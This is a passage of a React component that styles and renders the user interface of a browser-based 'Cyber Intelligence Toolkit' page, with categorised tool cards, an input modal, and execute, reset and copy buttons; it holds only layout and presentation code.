          border: 1px solid rgba(0,255,255,0.2);
          padding: 1.1rem 1.6rem 1rem;
          min-width: 120px;
          animation: countUp 0.6s ease both;
          transition: transform 0.2s, box-shadow 0.2s;
        }
        .tk-stat-card:hover {
          transform: translateY(-3px);
          box-shadow: 0 8px 30px rgba(0,255,255,0.15);
          border-color: rgba(0,255,255,0.5);
        }
        .tk-stat-card:nth-child(1) { animation-delay: 0.2s; }
        .tk-stat-card:nth-child(2) { animation-delay: 0.3s; }
        .tk-stat-card:nth-child(3) { animation-delay: 0.4s; }
        .tk-stat-card:nth-child(4) { animation-delay: 0.5s; }
        /* TL corner */
        .tk-stat-card::before {
          content: '';
          position: absolute; top:-1px; left:-1px;
          width:14px; height:14px;
          border-top: 2px solid #00ffff;
          border-left: 2px solid #00ffff;
        }
        /* BR corner */
        .tk-stat-card::after {
          content: '';
          position: absolute; bottom:-1px; right:-1px;
          width:14px; height:14px;
          border-bottom: 2px solid #00ffff;
          border-right: 2px solid #00ffff;
        }
        .tk-stat-num {
          font-family: 'Orbitron', monospace;
          font-size: 2rem;
          font-weight: 900;
          display: block;
          line-height: 1;
        }
        .s-cyan   { color: #00ffff; text-shadow: 0 0 15px rgba(0,255,255,0.6); }
        .s-red    { color: #ff6b6b; text-shadow: 0 0 15px rgba(255,107,107,0.5); }
        .s-purple { color: #a78bfa; text-shadow: 0 0 15px rgba(167,139,250,0.5); }
        .s-green  { color: #34d399; text-shadow: 0 0 15px rgba(52,211,153,0.5); }
        .tk-stat-label {
          font-size: 0.58rem;
          text-transform: uppercase;
          letter-spacing: 0.2em;
          color: rgba(150,180,190,0.5);
          margin-top: 0.35rem;
          display: block;
        }

        /* ── TABS ── */
        .tk-tabs {
          display: flex;
          margin-top: 2.5rem;
          border-bottom: 1px solid rgba(0,255,255,0.12);
          background: rgba(0,0,0,0.3);
          backdrop-filter: blur(8px);
          animation: fadeSlideUp 0.5s ease 0.3s both;
        }
        .tk-tab {
          display: flex;
          align-items: center;
          gap: 0.4rem;
          padding: 0.65rem 1.4rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.72rem;
          text-transform: uppercase;
          letter-spacing: 0.12em;
          cursor: pointer;
          background: transparent;
          border: none;
          border-bottom: 2px solid transparent;
          color: rgba(150,170,180,0.5);
          transition: all 0.2s;
          margin-bottom: -1px;
        }
        .tk-tab:hover { color: rgba(0,255,255,0.7); background: rgba(0,255,255,0.03); }
        .tk-tab.active {
          color: #00ffff;
          border-bottom-color: #00ffff;
          background: rgba(0,255,255,0.05);
          text-shadow: 0 0 8px rgba(0,255,255,0.4);
        }

        /* ── SECTION ── */
        .tk-section { margin-top: 2.5rem; animation: fadeSlideUp 0.5s ease both; }

        /* ── CATEGORY HEADER ── */
        .tk-cat-header {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          margin-bottom: 1.1rem;
          padding: 0.55rem 1rem;
          background: rgba(0,0,0,0.4);
          backdrop-filter: blur(10px);
          border-left: 3px solid var(--cat-color, #00ffff);
          border-bottom: 1px solid rgba(255,255,255,0.06);
          position: relative;
          overflow: hidden;
        }
        .tk-cat-header::after {
          content: '';
          position: absolute;
          inset: 0;
          background: linear-gradient(90deg, rgba(var(--cat-rgb, 0,255,255),0.06) 0%, transparent 70%);
          pointer-events: none;
        }
        .tk-cat-icon { font-size: 1.1rem; filter: drop-shadow(0 0 6px var(--cat-color, #00ffff)); }
        .tk-cat-title {
          font-family: 'Rajdhani', sans-serif;
          font-size: 1.05rem;
          font-weight: 700;
          color: var(--cat-color, #00ffff);
          text-transform: uppercase;
          letter-spacing: 0.08em;
          text-shadow: 0 0 12px rgba(var(--cat-rgb, 0,255,255), 0.5);
        }
        .tk-cat-line {
          flex: 1;
          height: 1px;
          background: linear-gradient(90deg, rgba(var(--cat-rgb,0,255,255),0.3), transparent);
          margin-left: 0.5rem;
        }
        .tk-cat-badge {
          font-size: 0.62rem;
          color: var(--cat-color, #00ffff);
          border: 1px solid var(--cat-color, #00ffff);
          padding: 0.1rem 0.5rem;
          background: rgba(var(--cat-rgb,0,255,255),0.08);
          letter-spacing: 0.05em;
        }

        /* ── TOOL GRID ── */
        .tk-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
          gap: 0.85rem;
        }

        /* ── TOOL CARD ── */
        .tk-card {
          background: rgba(0,0,0,0.5);
          backdrop-filter: blur(14px);
          border: 1px solid rgba(var(--cat-rgb,0,255,255),0.15);
          padding: 1.15rem 1.15rem 1rem;
          display: flex;
          flex-direction: column;
          gap: 0.7rem;
          position: relative;
          transition: border-color 0.25s, box-shadow 0.25s, transform 0.2s, background 0.25s;
          overflow: hidden;
          animation: cardIn 0.4s ease both;
        }
        /* TL corner bracket */
        .tk-card::before {
          content: '';
          position: absolute; top:-1px; left:-1px;
          width:10px; height:10px;
          border-top: 1.5px solid var(--cat-color, #00ffff);
          border-left: 1.5px solid var(--cat-color, #00ffff);
          transition: width 0.3s, height 0.3s;
        }
        /* Shimmer line */
        .tk-card::after {
          content: '';
          position: absolute;
          top: 0; left: -100%;
          width: 60%;
          height: 100%;
          background: linear-gradient(90deg, transparent, rgba(var(--cat-rgb,0,255,255),0.04), transparent);
          transition: left 0.5s ease;
        }
        .tk-card:hover {
          border-color: rgba(var(--cat-rgb,0,255,255),0.5);
          box-shadow: 0 0 20px rgba(var(--cat-rgb,0,255,255),0.1), inset 0 0 30px rgba(var(--cat-rgb,0,255,255),0.02);
          transform: translateY(-3px);
          background: rgba(0,0,0,0.65);
        }
        .tk-card:hover::before { width: 18px; height: 18px; }
        .tk-card:hover::after  { left: 140%; }

        /* Card top strip */
        .tk-card-strip {
          height: 2px;
          background: linear-gradient(90deg, var(--cat-color, #00ffff), transparent);
          margin: -1.15rem -1.15rem 0;
          opacity: 0.5;
          transition: opacity 0.25s;
        }
        .tk-card:hover .tk-card-strip { opacity: 1; }

        .tk-card-name {
          font-family: 'Rajdhani', sans-serif;
          font-size: 0.92rem;
          font-weight: 700;
          color: var(--cat-color, #00ffff);
          text-transform: uppercase;
          letter-spacing: 0.04em;
          line-height: 1.2;
        }
        .tk-card-desc {
          font-size: 0.7rem;
          color: rgba(170,195,205,0.6);
          line-height: 1.6;
          flex: 1;
        }
        .tk-open-btn {
          background: rgba(var(--cat-rgb,0,255,255),0.06);
          border: 1px solid rgba(var(--cat-rgb,0,255,255),0.3);
          color: var(--cat-color, #00ffff);
          padding: 0.48rem 0.75rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.64rem;
          text-transform: uppercase;
          letter-spacing: 0.1em;
          cursor: pointer;
          width: 100%;
          transition: all 0.2s;
          display: flex; align-items: center; justify-content: center; gap: 0.35rem;
          position: relative;
          overflow: hidden;
        }
        .tk-open-btn::before {
          content: '';
          position: absolute;
          inset: 0;
          background: var(--cat-color, #00ffff);
          transform: scaleX(0);
          transform-origin: left;
          transition: transform 0.25s ease;
          z-index: 0;
        }
        .tk-open-btn span { position: relative; z-index: 1; }
        .tk-open-btn:hover { color: #000; border-color: var(--cat-color,#00ffff); box-shadow: 0 0 12px rgba(var(--cat-rgb,0,255,255),0.3); }
        .tk-open-btn:hover::before { transform: scaleX(1); }

        /* ── MODAL ── */
        .tk-modal-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.8);
          backdrop-filter: blur(10px);
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 1rem;
          z-index: 9999;
          animation: fadeIn 0.2s ease both;
        }
        .tk-modal {
          background: rgba(0,5,15,0.85);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(0,255,255,0.35);
          width: 100%;
          max-width: 680px;
          max-height: 90vh;
          overflow-y: auto;
          padding: 2rem;
          position: relative;
          box-shadow: 0 0 60px rgba(0,255,255,0.1), inset 0 0 60px rgba(0,255,255,0.02);
          animation: fadeSlideUp 0.3s ease both;
        }
        .tk-modal::before {
          content: '';
          position: absolute; top:-1px; left:-1px;
          width: 22px; height: 22px;
          border-top: 2px solid #00ffff;
          border-left: 2px solid #00ffff;
        }
        .tk-modal::after {
          content: '';
          position: absolute; bottom:-1px; right:-1px;
          width: 22px; height: 22px;
          border-bottom: 2px solid #00ffff;
          border-right: 2px solid #00ffff;
        }
        .tk-modal::-webkit-scrollbar { width: 3px; }
        .tk-modal::-webkit-scrollbar-track { background: transparent; }
        .tk-modal::-webkit-scrollbar-thumb { background: rgba(0,255,255,0.3); }

        .tk-modal-close {
          position: absolute; top:0.9rem; right:0.9rem;
          background: transparent;
          border: 1px solid rgba(0,255,255,0.25);
          color: rgba(0,255,255,0.5);
          padding: 0.2rem 0.6rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.65rem;
          cursor: pointer;
          letter-spacing: 0.08em;
          transition: all 0.18s;
        }
        .tk-modal-close:hover { background: rgba(0,255,255,0.1); color: #00ffff; border-color: #00ffff; }

        .tk-modal-title {
          font-family: 'Orbitron', monospace;
          font-size: 1.1rem;
          font-weight: 700;
          color: #00ffff;
          text-transform: uppercase;
          letter-spacing: 0.06em;
          margin-bottom: 0.4rem;
          padding-right: 5rem;
          text-shadow: 0 0 15px rgba(0,255,255,0.4);
        }
        .tk-modal-desc { font-size: 0.75rem; color: rgba(160,190,200,0.65); margin-bottom: 1.5rem; line-height: 1.65; }

        .tk-label {
          display: block;
          font-size: 0.6rem;
          text-transform: uppercase;
          letter-spacing: 0.15em;
          color: rgba(0,255,255,0.4);
          margin-bottom: 0.45rem;
        }
        .tk-textarea {
          width: 100%;
          background: rgba(0,0,0,0.6);
          backdrop-filter: blur(8px);
          border: 1px solid rgba(0,255,255,0.15);
          padding: 0.7rem 0.9rem;
          color: #00ffff;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.75rem;
          outline: none;
          height: 110px;
          resize: vertical;
          transition: border-color 0.2s, box-shadow 0.2s;
          line-height: 1.55;
        }
        .tk-textarea:focus { border-color: rgba(0,255,255,0.5); box-shadow: 0 0 10px rgba(0,255,255,0.08); }
        .tk-textarea::placeholder { color: rgba(0,255,255,0.15); font-size: 0.68rem; }

        .tk-file-input {
          background: rgba(0,255,255,0.03);
          border: 1px dashed rgba(0,255,255,0.2);
          padding: 0.9rem;
          width: 100%;
          color: rgba(0,255,255,0.5);
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.72rem;
          cursor: pointer;
        }

        .tk-actions { display: flex; gap: 0.65rem; margin-top: 0.9rem; }
        .tk-exec-btn {
          flex: 1;
          background: rgba(0,255,255,0.08);
          border: 1px solid rgba(0,255,255,0.4);
          color: #00ffff;
          padding: 0.7rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.7rem;
          text-transform: uppercase;
          letter-spacing: 0.1em;
          cursor: pointer;
          transition: all 0.2s;
          position: relative; overflow: hidden;
        }
        .tk-exec-btn::after {
          content: '';
          position: absolute; inset: 0;
          background: #00ffff;
          transform: scaleX(0);
          transform-origin: left;
          transition: transform 0.25s ease;
          z-index: 0;
        }
        .tk-exec-btn:hover { color: #000; box-shadow: 0 0 20px rgba(0,255,255,0.3); }
        .tk-exec-btn:hover::after { transform: scaleX(1); }
        .tk-exec-btn span { position: relative; z-index: 1; }

        .tk-reset-btn {
          background: transparent;
          border: 1px solid rgba(255,255,255,0.1);
          color: rgba(255,255,255,0.35);
          padding: 0.7rem 1.1rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.7rem;
          cursor: pointer;
          transition: all 0.2s;
        }
        .tk-reset-btn:hover { background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.7); border-color: rgba(255,255,255,0.25); }

        .tk-output {
          margin-top: 1.1rem;
          background: rgba(0,0,0,0.65);
          backdrop-filter: blur(8px);
          border: 1px solid rgba(0,255,255,0.2);
          padding: 1rem;
          animation: fadeSlideUp 0.3s ease both;
        }
        .tk-output-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.14em; color: rgba(0,255,255,0.45); margin-bottom: 0.5rem; display: block; }
        .tk-output pre { color: #00ffff; font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; white-space: pre-wrap; word-break: break-all; line-height: 1.6; margin: 0; }
        .tk-copy-btn {
          margin-top: 0.65rem;
          background: transparent;
          border: 1px solid rgba(0,255,255,0.18);
          color: rgba(0,255,255,0.4);
          padding: 0.28rem 0.75rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.6rem;
          cursor: pointer;
          letter-spacing: 0.08em;
          transition: all 0.18s;
        }
        .tk-copy-btn:hover { background: rgba(0,255,255,0.08); color: #00ffff; border-color: rgba(0,255,255,0.4); }

        @media (max-width: 640px) {
          .tk-inner { padding: 0 1rem 3rem; }
          .tk-grid { grid-template-columns: 1fr 1fr; }
          .tk-hero-cyber { font-size: 3rem !important; }
          .tk-hero-intel { font-size: 2.6rem !important; }
        }
        @media (max-width: 420px) {
          .tk-grid { grid-template-columns: 1fr; }
        }
      `}</style>

      {/* ── BG LAYERS ── */}
      <canvas
        ref={matrixRef}
        className="tk-matrix-canvas"
        style={{
          opacity: scrollY > 300
            ? Math.max(0.08, 0.55 - (scrollY - 300) / 600)
            : 0.55
        }}
      />
      <div className={`tk-vignette${scrollY > 300 ? ' dimmed' : ''}`} />
      <div className="tk-scanline" />

      <div className="tk-root">
        {/* ── NAV ── */}
        <nav className="tk-nav">
          <span className="tk-nav-brand">CYBERTOOLKIT</span>
          <div className="tk-nav-right">
            <button className="tk-nav-back" onClick={() => window.history.back()}>← BACK</button>
            <div className="tk-nav-dot" />
          </div>
        </nav>

        <div className="tk-inner">
          {/* ── HERO ── */}
          <div className="tk-hero">
            <div className="tk-hero-status">
              <div className="tk-status-dot" />
              SYSTEM ONLINE · {tools.length} TOOLS ACTIVE
            </div>
            <div>
              <span className="tk-hero-cyber">CYBER</span>
              <span className="tk-hero-intel">INTELLIGENCE</span>
              <span className="tk-hero-version">TOOLKIT v2.0</span>
            </div>
            <p className="tk-hero-desc">
              {tools.length} browser-based security tools across {TOOL_CATEGORIES.length} categories —
              OSINT, network, web security, cryptography &amp; forensics. Fully client-side.
            </p>

            {/* Stat cards */}
            <div className="tk-stats-row">
              {[
                { val: tools.length,            label: 'Tools',       cls: 's-cyan'   },
                { val: TOOL_CATEGORIES.length,  label: 'Categories',  cls: 's-red'    },
                { val: '100%',                  label: 'Client-Side', cls: 's-purple' },
                { val: 0,                       label: 'Data Leaks',  cls: 's-green'  },
              ].map((s, i) => (
                <div className="tk-stat-card" key={i} style={{ animationDelay: `${0.2 + i * 0.1}s` }}>
                  <span className={`tk-stat-num ${s.cls}`}>{s.val}</span>
                  <span className="tk-stat-label">{s.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ── TABS ── */}
          <div className="tk-tabs">
            {(['all', 'featured'] as const).map(tab => (
              <button
                key={tab}
                className={`tk-tab${activeTab === tab ? ' active' : ''}`}
                onClick={() => setActiveTab(tab)}
              >
                {tab === 'featured' ? '⚡ FEATURED' : '▦ ALL TOOLS'}
              </button>
            ))}
          </div>

          {/* ── CATEGORIES ── */}
          {TOOL_CATEGORIES.map((category, catIdx) => {
            const catTools = tools.filter(t => t.category === category);
            if (catTools.length === 0) return null;

            const catColors: Record<string, { color: string; rgb: string }> = {
              'Security & Penetration Testing':    { color: '#00ffff', rgb: '0,255,255' },
              'Password & Authentication':          { color: '#ff6b6b', rgb: '255,107,107' },
              'Encoding, Decoding & Cryptography': { color: '#a78bfa', rgb: '167,139,250' },
              'Digital Forensics & Analysis':       { color: '#34d399', rgb: '52,211,153' },
              'Networking & IP Calculation':        { color: '#fbbf24', rgb: '251,191,36' },
              'Storage, Cloud & Data Transfer':     { color: '#60a5fa', rgb: '96,165,250' },
              'General Developer & Utility':        { color: '#f472b6', rgb: '244,114,182' },
            };
            const cc = catColors[category] || { color: '#00ffff', rgb: '0,255,255' };

            return (
              <section
                key={category}
                className="tk-section"
                style={{ animationDelay: `${0.1 * catIdx}s` }}
              >
                <div
                  className="tk-cat-header"
                  style={{ '--cat-color': cc.color, '--cat-rgb': cc.rgb } as React.CSSProperties}
                >
                  <span className="tk-cat-icon">{CATEGORY_ICONS[category]}</span>
                  <h2 className="tk-cat-title">{category}</h2>
                  <div className="tk-cat-line" />
                  <span className="tk-cat-badge">{catTools.length}</span>
                </div>

                <div className="tk-grid">
                  {catTools.map((tool, tIdx) => (
                    <div
                      key={tool.id}
                      className="tk-card"
                      style={{
                        '--cat-color': cc.color,
                        '--cat-rgb': cc.rgb,
                        animationDelay: `${0.05 * tIdx}s`,
                      } as React.CSSProperties}
                    >
                      <div className="tk-card-strip" />
                      <div className="tk-card-name">{tool.name}</div>
                      <p className="tk-card-desc">{tool.description}</p>
                      <button className="tk-open-btn" onClick={() => openTool(tool)}>
                        <span>▶ OPEN TOOL</span>
                      </button>
                    </div>
                  ))}
                </div>
              </section>
            );
          })}
        </div>
      </div>

      {/* ── MODAL ── */}
      {selectedTool && (
        <div className="tk-modal-overlay" onClick={e => { if (e.target === e.currentTarget) setSelectedTool(null); }}>
          <div className="tk-modal">
            <button className="tk-modal-close" onClick={() => setSelectedTool(null)}>[ ESC ]</button>
            <h2 className="tk-modal-title">{selectedTool.name}</h2>
            <p className="tk-modal-desc">{selectedTool.description}</p>

            {needsFileInput ? (
              <div style={{ marginBottom: '1rem' }}>
                <label className="tk-label">
                  {selectedTool.id === 'file-hash' ? 'Select File to Hash' : 'Select Image File'}
                </label>
                <input
                  ref={fileInputRef}
                  type="file"
                  className="tk-file-input"
                  accept={selectedTool.id === 'exif-view' ? 'image/*' : '*'}
                  onChange={selectedTool.id === 'file-hash' ? handleFileChange : handleExifFile}
                />
              </div>
            ) : (
              <div>
                <label className="tk-label">{selectedTool.inputLabel || 'Input Data'}</label>
                <textarea
                  className="tk-textarea"
                  value={input}
                  onChange={e => setInput(e.target.value)}
                  placeholder={selectedTool.inputPlaceholder || 'Enter data...'}
                />
              </div>
            )}

            <div className="tk-actions">
              {!needsFileInput && (
                <button className="tk-exec-btn" onClick={handleExecute}>
                  <span>▶ EXECUTE TASK</span>
                </button>
              )}
              <button
                className="tk-reset-btn"
                onClick={() => { setInput(''); setOutput(''); setFileOutput(''); if (fileInputRef.current) fileInputRef.current.value = ''; }}
              >
                RESET
              </button>
            </div>

            {(output || fileOutput) && (
              <div className="tk-output">
                <span className="tk-output-label">▌ Output Result</span>
                <pre>{output || fileOutput}</pre>
                <button className="tk-copy-btn" onClick={() => navigator.clipboard.writeText(output || fileOutput)}>
                  [ COPY OUTPUT ]
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </>
  );
};

export default Toolkit;